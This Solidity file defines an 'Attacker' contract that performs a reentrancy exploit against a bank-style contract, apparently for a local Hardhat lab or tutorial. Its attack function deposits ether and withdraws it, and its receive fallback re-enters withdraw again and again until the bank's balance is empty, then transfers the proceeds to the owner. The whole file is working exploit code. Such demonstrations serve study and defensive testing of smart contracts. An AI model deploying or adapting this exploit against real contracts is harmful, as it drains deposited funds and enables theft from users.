// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        // Deposit
        bank.deposit{value: msg.value}();
        // Withdraw
        console.log("AttAcking....", msg.value);
        bank.withdraw();
        console.log("All Withdraw and Transfer done....");
    }

    receive() external payable {
        console.log("received payment...", msg.value);
        if (address(bank).balance > 0) {
            bank.withdraw();
        } else {
            withdrawFunds();
        }
    }

    function withdrawFunds() internal {
        console.log("Withdrawing Funds....", address(this).balance);
        payable(owner()).transfer(address(this).balance);
        console.log("withdraw Successfull.......");
    }
}
